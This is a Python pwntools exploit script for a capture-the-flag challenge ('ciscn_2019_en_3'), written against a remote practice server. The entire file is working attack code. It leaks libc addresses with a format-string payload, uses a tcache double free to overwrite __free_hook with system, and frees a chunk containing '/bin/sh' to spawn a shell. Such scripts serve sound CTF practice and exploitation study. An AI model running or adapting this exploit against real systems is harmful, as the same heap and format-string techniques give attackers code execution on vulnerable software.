# coding:utf-8
from glob import glob
from os import system
from random import SystemRandom
from pwn import *
context.log_level = 'debug'

proc_name = 'ciscn_2019_en_3'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 29987)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(size, content):
    p.recvuntil("Input your choice:")
    p.sendline("1")
    p.recvuntil("story: \n")
    p.sendline(str(size))
    p.recvuntil("story: \n")
    p.send(content)

def delete(index):
    p.recvuntil("Input your choice:")
    p.sendline("4")
    p.recvuntil("index:\n")
    p.sendline(str(index))


def leak():
    global __free_hook
    global system_addr

    p.recvuntil("name?\n")
    p.sendline('%p.%p.%p.%p.%p.%p.%p')
    _IO_file_setbuf_addr = int(p.recvuntil("Please")[55:69],16) - 0x9
    libc_base = _IO_file_setbuf_addr - 0x8a850
    __free_hook = libc_base + 0x3ed8e8
    system_addr = libc_base + 0x4f440
    log.success("_IO_file_setbuf_addr => " + hex(_IO_file_setbuf_addr))
    log.success("libc_base => " + hex(libc_base))
    log.success("__free_hook => " + hex(__free_hook))
    log.success("system_addr => " + hex(system_addr))
    p.recvuntil("ID.\n")
    p.sendline("1")

def pwn():
    add(0x20, b'a' * 8)
    add(0x20, b'/bin/sh\x00')
    # debug(0)
    delete(0)
    delete(0)
    # debug(0)
    add(0x20, p64(__free_hook))
    add(0x20, b'b' * 8)             # fd -> __free_hook
    add(0x20, p64(system_addr))     
    delete(1)

    p.interactive()

if __name__ == '__main__':
    leak()
    pwn()